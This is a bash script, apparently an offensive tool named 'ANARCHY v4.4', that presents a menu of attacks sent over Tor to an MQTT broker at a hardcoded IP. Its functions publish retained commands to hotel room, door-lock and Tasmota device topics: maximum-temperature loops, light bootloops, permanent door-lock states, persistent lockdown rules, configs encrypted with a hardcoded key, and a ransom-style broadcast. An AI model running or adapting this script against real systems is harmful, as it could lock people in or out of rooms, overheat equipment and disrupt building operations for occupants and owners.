#!/bin/bash
# ANARCHY v4.4 - WILDCARD PUBLISH FIXED
set -euo pipefail

MQTT_HOST="104.198.241.70"
MQTT_PORT="1883"
TOR="torsocks"
MAX_TEMP="99.9"
MAX_BRIGHT="255"
MAX_POWER="100"
LOCKED_STATUS="LOCKED-TRUSTEDF57"
SYS="mosquitto"
RANSOM_MSG=" LOCKDOWN - TRUSTEDF57\nI DON'T WANT MONEY, I WANT ANARCHY!"

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
}

TOR_PUB() {
    ${TOR} mosquitto_pub -h "${MQTT_HOST}" -p "${MQTT_PORT}" -r -q 2 -t "$1" -m "$2"
}

TOR_PUB_Q1() {
    ${TOR} mosquitto_pub -h "${MQTT_HOST}" -p "${MQTT_PORT}" -r -q 1 -t "$1" -m "$2"
}

show_menu() {
    clear
    cat << 'EOF'
┌─ TRUSTEDF57 - WILDCARD FIXED ─────────────────┐
│ 1) FORCE ONLINE (Specific)                      │
│ 2) MAX TEMP LOOP                                │
│ 3) LIGHTS BOOTLOOP                              │
│ 4) DOORS LOCKED FOREVER                         │
│ 5) HOTEL ROOMS LOCKDOWN                         │
│ 6) TASMOTA RULE LOCK                            │
│ 7) RANSOM BROADCAST                             │
│ 8) CONFIGS ENCRYPTED                            │
│ 9) TOTAL ANARCHY                                │
│ 0) EXIT                                         │
└─────────────────────────────────────────────────┘
EOF
}

# FIXED: Specific topics NO wildcards for PUBLISH
force_online() {
    echo "[+] Force online - SPECIFIC devices..."
    TOR_PUB "cmnd/tasmota/LWT" "Online"
    TOR_PUB_Q1 "hotel/rooms/1205/LWT" "Online"
    TOR_PUB_Q1 "hotel/rooms/1001/LWT" "Online"
    TOR_PUB_Q1 "digy/digy/236/LWT" "Online"
    TOR_PUB_Q1 "digy/digy/0235/LWT" "Online"
    TOR_PUB_Q1 "tasmota/discovery/4CEBD69E0A49/LWT" "Online"
}

temp_loop() {
    echo "[🌡️] MAX TEMP ${MAX_TEMP}..."
    TOR_PUB_Q1 "cmnd/tasmota/Temp" "${MAX_TEMP}"
    TOR_PUB_Q1 "tele/tasmota/SENSOR" "{\"Temp\":${MAX_TEMP}}"
    local loop_cmd="Rule1 ON tele/%topic%/SENSOR#Temp DO Temp ${MAX_TEMP} ENDON;Rule1 1"
    TOR_PUB_Q1 "cmnd/tasmota/Rule1" "${loop_cmd}"
}

lights_loop() {
    echo "[💡] LIGHTS BOOTLOOP..."
    local light_rule="Rule1 ON System#Boot DO Backlog Power1 1;Delay 500;Power1 0;Delay 500;Power1 1;Brightness ${MAX_BRIGHT};Power1 1;ENDON;Rule1 1"
    TOR_PUB "cmnd/tasmota/Backlog" "${light_rule}"
    TOR_PUB "cmnd/tasmota/Power1" "1"
    TOR_PUB "cmnd/tasmota/Brightness" "${MAX_BRIGHT}"
}

doors_locked() {
    local locks=("digy/digy/236/door" "digy/digy/236/lock" "digy/digy/236/lock/stat" 
                 "digy/digy/0235/door" "digy/digy/0235/lock" "digy/digy/0235/lock/stat")
    for lock in "${locks[@]}"; do
        echo "[🚪] ${lock} -> LOCKED"
        TOR_PUB "${lock}" "${LOCKED_STATUS},${MAX_POWER},PERMANENT"
    done
}

hotel_lockdown() {
    local rooms=("hotel/rooms/1205/birth" "hotel/rooms/1001/birth" 
                 "hotel/rooms/1205/config" "hotel/rooms/1001/config")
    for room in "${rooms[@]}"; do
        echo "[🏨] ${room} -> LOCKDOWN"
        if [[ "${room}" == *"birth"* ]]; then
            TOR_PUB "${room}" "{\"online\":true,\"status\":\"${LOCKED_STATUS}\"}"
        else
            local locked_config="{\"roomId\":\"${LOCKED_STATUS}\",\"temp\":${MAX_TEMP},\"control\":\"BLOCKED\"}"
            local crypt_config=$(ENCRYPT_PAYLOAD "${locked_config}")
            TOR_PUB "${room}" "${crypt_config}"
        fi
    done
}

tasmota_lock() {
    local macs=("4CEBD69E0A49" "4CEBD6C0E09F" "DC4F22C928DF")
    for mac in "${macs[@]}"; do
        echo "[⚡] tasmota/${mac} -> LOCK"
        local base="tasmota/discovery/${mac}"
        local lockdown_rule="Rule1 ON System#Boot DO Backlog Power1 100;Temp ${MAX_TEMP};Brightness ${MAX_BRIGHT};MqttRetain 1;Rule1 ON Power1 DO Power1 100 ENDON;ENDON;Rule1 1"
        TOR_PUB "${base}/cmnd/Rule1" "${lockdown_rule}"
        TOR_PUB "${base}/cmnd/Backlog" "Restart 1"
    done
}

ransom_broadcast() {
    echo "[📢] RANSOM Broadcast - MULTI TOPIC..."
    # Specific rooms/doors invece di wildcard
    TOR_PUB "hotel/rooms/1205/birth" "${RANSOM_MSG}"
    TOR_PUB "hotel/rooms/1001/birth" "${RANSOM_MSG}"
    TOR_PUB "digy/digy/236/door" "${RANSOM_MSG}"
    TOR_PUB "digy/digy/0235/door" "${RANSOM_MSG}"
    TOR_PUB "tasmota/discovery/4CEBD69E0A49/config" "${RANSOM_MSG}"
    TOR_PUB "${SYS}/broker/version" "${RANSOM_MSG}"
}

lock_configs() {
    echo "[🔒] Encrypt configs..."
    local locked_json="{\"status\":\"${LOCKED_STATUS}\",\"control\":\"BLOCKED\"}"
    local crypt_json=$(ENCRYPT_PAYLOAD "${locked_json}")
    TOR_PUB "tasmota/discovery/4CEBD69E0A49/config" "${crypt_json}"
    TOR_PUB "hotel/rooms/1205/config" "${crypt_json}"
    TOR_PUB "hotel/rooms/1001/config" "${crypt_json}"
}

total_anarchy() {
    echo "🎪 TOTAL ANARCHY v4.4..."
    force_online
    temp_loop
    lights_loop
    doors_locked
    hotel_lockdown
    tasmota_lock
    ransom_broadcast
    lock_configs
    echo "✅ ANARCHY DEPLOYED - NO WILDCARDS"
}

# MAIN LOOP
while true; do
    show_menu
    read -r CHOICE </dev/tty
    case "${CHOICE}" in
        1) force_online ;;
        2) temp_loop ;;
        3) lights_loop ;;
        4) doors_locked ;;
        5) hotel_lockdown ;;
        6) tasmota_lock ;;
        7) ransom_broadcast ;;
        8) lock_configs ;;
        9) total_anarchy ;;
        0) echo "[+] Exiting..."; exit 0 ;;
        *) echo "❌ Invalid: ${CHOICE}" ;;
    esac
    echo
    read -r -p "Press ENTER..." </dev/tty
done
